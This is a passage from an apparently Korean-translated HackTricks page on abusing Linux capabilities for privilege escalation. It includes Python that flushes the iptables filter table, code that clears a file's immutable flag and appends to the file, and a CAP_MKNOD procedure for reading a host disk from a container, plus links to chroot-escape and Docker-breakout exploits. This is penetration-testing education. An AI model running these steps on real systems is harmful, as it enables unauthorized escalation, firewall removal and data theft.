```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**이 capability는 immutable 및 append-only와 같은 inode flags를 수정할 수 있게 합니다.** 이는 더 광범위한 privilege escalation 권한을 직접 부여하지는 않습니다.<sup>[[14]](#references)</sup>

**binary 예시**

파일이 immutable이고 python이 이 capability를 가진 것을 확인했다면, **immutable attribute를 제거하고 파일을 수정 가능하게 만들 수 있습니다:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` 및 `FS_IOC_SETFLAGS` 연산은 inode 플래그를 읽고 업데이트합니다. `FS_IMMUTABLE_FL`은 이 예제에서 해제되는 immutable 플래그입니다.<sup>[[27]](#references)</sup>

> [!TIP]
> 일반적으로 이 immutable attribute는 다음 명령으로 설정하고 제거합니다:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `chroot(2)` system call을 실행할 수 있도록 하며, 알려진 취약점을 통해 `chroot(2)` environment에서 escape할 수 있습니다.<sup>[[11]](#references)[[14]](#references)</sup>

- [다양한 chroot solution에서 break out하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 system restart를 위한 `reboot(2)` system call의 실행을 허용하며, 여기에는 `LINUX_REBOOT_CMD_RESTART2`와 같은 command가 포함됩니다. 또한 각각 새로운 crash kernel 또는 signed crash kernel을 load하기 위한 `kexec_load(2)`와 Linux 3.17 이후의 `kexec_file_load(2)`도 활성화합니다.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 Linux 2.6.37에서 더 광범위한 **CAP_SYS_ADMIN**으로부터 분리되었으며, 구체적으로 `syslog(2)` call을 사용할 수 있는 권한을 부여합니다. 이 capability는 `kptr_restrict` setting이 1일 때 `/proc` 및 유사한 interface를 통해 kernel address를 확인할 수 있도록 합니다. `kptr_restrict`는 kernel address의 노출 여부를 제어합니다. Linux 2.6.39 이후 `kptr_restrict`의 default는 0이며, 이는 kernel address가 노출된다는 의미입니다. 하지만 많은 distribution은 보안상의 이유로 이를 1(uid 0을 제외하고 address 숨김) 또는 2(address 항상 숨김)로 설정합니다.<sup>[[14]](#references)</sup>

또한 `dmesg_restrict`가 1로 설정된 경우 **CAP_SYSLOG**를 사용하면 `dmesg` output에 access할 수 있습니다. 이러한 변경에도 불구하고 역사적인 선례로 인해 **CAP_SYS_ADMIN**은 `syslog` operation을 수행할 수 있는 권한을 계속 유지합니다.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 regular file, FIFO(named pipe) 또는 UNIX domain socket을 생성하는 것 이상으로 `mknod` system call의 기능을 확장합니다. 특히 다음을 포함하는 special file을 생성할 수 있도록 합니다:<sup>[[14]](#references)</sup>

- **S_IFCHR**: terminal과 같은 character special file.
- **S_IFBLK**: disk와 같은 block special file.

이 capability는 character 또는 block device를 포함한 device file을 생성해야 하는 process에 유용합니다.<sup>[[14]](#references)</sup>

이 capability는 Docker의 문서화된 default capability set에 포함되어 있습니다. 모든 deployment가 동일한 default를 사용한다고 가정하지 말고 실제 runtime configuration을 확인해야 합니다([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

이 capability는 다음 조건에서 host에 대한 privilege escalation(full disk read)을 가능하게 합니다:<sup>[[7]](#references)</sup>

1. Host에 대한 initial access가 있어야 합니다(Unprivileged).
2. Container에 대한 initial access가 있어야 합니다(Privileged (EUID 0)이며 effective `CAP_MKNOD` 보유).
3. Host와 container는 동일한 user namespace를 공유해야 합니다.

**Container에서 Block Device를 생성하고 Access하는 단계:**

1. **Standard User로 Host에서:**

- `id`를 사용하여 현재 user ID를 확인합니다(예: `uid=1000(standarduser)`).
- Target device를 식별합니다(예: `/dev/sdb`).

2. **`root`로 Container 내부에서:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Host로 돌아가기:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
이 접근 방식을 사용하면 장치, namespace 및 권한이 설명된 대로 구성된 경우 standard user가 container를 통해 `/dev/sdb`에 접근하고 잠재적으로 데이터를 읽을 수 있습니다.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities가 적용된 현재 Linux kernel에서 **`CAP_SETPCAP`**은 thread가 자신의 bounding set에서 inheritable set으로 capabilities를 추가하고, bounding set에서 capabilities를 제거하며, securebits를 변경할 수 있도록 합니다. 다른 process에 임의로 capabilities를 부여할 수는 없습니다. 이러한 동작은 file-capability 지원이 없는 2.6.25 이전 kernel에만 적용됩니다.<sup>[[14]](#references)</sup>

`capset()` system call은 thread 자체의 effective, permitted 및 inheritable set을 조정할 수 있지만, 새로운 permitted set에는 기존 permitted set에 없는 capabilities를 포함할 수 없으며 inheritable 업데이트도 kernel 제약의 적용을 받습니다.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation labs](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [mount namespace에 대한 /proc/pid/root를 통한 접근 악용](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: 존재 이유와 작동 방식](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux에서 Capabilities 이해하기](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace가 허용된 경우 seccomp 우회를 위한 PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [다양한 chroot 솔루션에서 탈출하는 방법](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer가 작성한 원본 CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit 분석](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
